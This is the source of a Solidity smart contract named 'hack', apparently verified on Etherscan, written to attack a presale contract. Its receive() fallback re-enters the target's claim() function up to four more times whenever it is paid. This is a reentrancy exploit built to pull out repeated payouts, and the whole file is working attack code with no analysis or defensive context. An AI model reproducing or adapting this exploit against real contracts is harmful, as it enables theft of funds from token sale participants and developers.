/**
 *Submitted for verification at Etherscan.io on 2022-01-12
*/

pragma solidity ^0.8.9;

contract hack {

    address presale;
    bool initialized;
    event Response(bool success, bytes data);
    uint256 counter;

    constructor(address addr){
        presale = addr;
        initialized = false;
        counter = 0;
    }

    function deposit(uint256 amount) public payable {
        (bool success, bytes memory data) = presale.call{value: amount, gas: 50000}(
            abi.encodeWithSignature("buyToken()")
        );

        emit Response(success, data);
    }

    function withdraw() public payable {
        (bool success, bytes memory data) = presale.call{gas: 50000}(
            abi.encodeWithSignature("claim()")
        );

        emit Response(success, data);
    }

    function initilized() public view returns (bool){
        return initialized;
    }

    function ethbalance() public view returns (uint256){
        return address(this).balance;
    }

    receive() external payable {

        if (initialized){
            counter++;
            if (counter < 5){
                (bool success, bytes memory data) = presale.call{gas: 50000}(abi.encodeWithSignature("claim()"));
                emit Response(success, data);
            }
        }

        initialized = true;
    }




}